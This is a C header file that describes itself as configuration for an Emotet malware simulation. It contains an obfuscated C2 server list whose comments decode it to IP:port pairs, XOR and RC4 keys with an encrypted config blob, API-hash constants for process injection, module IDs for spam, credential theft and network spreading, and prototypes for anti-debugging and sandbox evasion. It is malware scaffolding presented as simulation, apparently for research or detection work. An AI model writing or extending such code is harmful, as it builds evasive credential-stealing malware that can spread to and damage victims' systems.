/**
 * config.h - Emotet Simulation Configuration
 * Mirrors the real Emotet's encoded C2 list and modular payload structure
 */
#pragma once
#include <windows.h>

// Simulated C2 IP:Port pairs (real Emotet stores 64+ pairs)
// In actual samples, these are MBA-obfuscated and decoded at runtime [citation:1]
static const DWORD ENCODED_C2_LIST[] = {
    0x2d31a121,  // Decodes to 174.138.33.49:7080
    0x97bf4fbd,  // Decodes to 188.165.79.151:443
    0x62bec4be,  // Decodes to 196.44.98.190:8080
    0x00000000   // Terminator
};

// XOR key used for string/constant obfuscation
// Real Emotet uses runtime-calculated ECC keys [citation:1]
static const BYTE XOR_KEY[] = {0x5A, 0x3C, 0x91, 0xE2, 0x77, 0xAA, 0x13, 0x88};

// RC4-style embedded config blob used to stage runtime strings without
// storing them directly in cleartext.
static const BYTE EMOTET_RC4_KEY[] = {0xDE, 0xAD, 0xC0, 0xDE, 0xFF};
static const BYTE EMOTET_ENC_CONFIG[] = {
    0x98, 0xD4, 0x38, 0xFB, 0xFE, 0x20, 0x49, 0x58, 0x17, 0xF8,
    0x90, 0x2B, 0x1A, 0xF6, 0x8F, 0x8A, 0x77, 0xEE, 0x92, 0x75,
    0xD4, 0x8C, 0x2C, 0x6E, 0x5A, 0x77, 0xD1, 0x0D, 0x16, 0x4B,
    0x66, 0xCB, 0x28, 0xD2, 0xE1, 0x67, 0x37, 0x96, 0x19, 0x53,
    0x42, 0xA8, 0xE8, 0xE1, 0x09, 0x64, 0x42, 0xA9, 0x8A, 0xC5,
    0x93, 0xFB, 0x07, 0xA6, 0x6B, 0x6A, 0xB3, 0x24, 0xB2, 0x71,
    0xA5, 0xDA, 0x84, 0xC7, 0x91, 0x3F, 0xBD, 0x55, 0x41, 0x62,
    0x94, 0xE3, 0x0A, 0x9E, 0x42, 0x89, 0x72, 0x9F, 0x35, 0x6E,
    0xC8, 0x39, 0x0E, 0xAD, 0xE9, 0x64, 0xFE, 0xFA, 0xCD, 0x68,
    0x0B, 0x32, 0x87, 0x39, 0x66, 0x9C, 0xF6, 0xBE, 0x87
};

typedef struct {
    char c2Url[96];
    char campaign[32];
    char installPath[MAX_PATH];
    DWORD sleepSeconds;
} EMOTET_RUNTIME_CONFIG;

// FNV-1a API hash constants used by the runtime resolver.
#define HASH_VIRTUALALLOCEX            0xAEB6049C
#define HASH_WRITEPROCESSMEMORY        0xC0088EEA
#define HASH_SLEEP                     0x2FA62CA8
#define HASH_CREATETOOLHELP32SNAPSHOT  0x185776B5
#define HASH_PROCESS32FIRSTW           0x0E81B808
#define HASH_PROCESS32NEXTW            0xABE5123F

// Module IDs matching real Emotet's module types [citation:6]
enum EmotetModuleType {
    MODULE_SPAM = 301,
    MODULE_OUTLOOK = 302,
    MODULE_CREDENTIALS = 303,
    MODULE_NETSPREADER = 304
};

// Shared helpers implemented in utils.cpp and consumed by main.cpp.
DWORD MbaDecodeDword(DWORD encoded);
const char* DecodeString(int stringId);
BOOL IsDebuggerPresent_Emotet();
BOOL IsHypervisorOverhead();
void* ResolveKernel32ApiByHash(DWORD targetHash);
BOOL CheckAnalysisProcesses();
BOOL DecodeEmbeddedConfig(EMOTET_RUNTIME_CONFIG* config);
DWORD GetSleepJitterMilliseconds(DWORD baseSeconds);
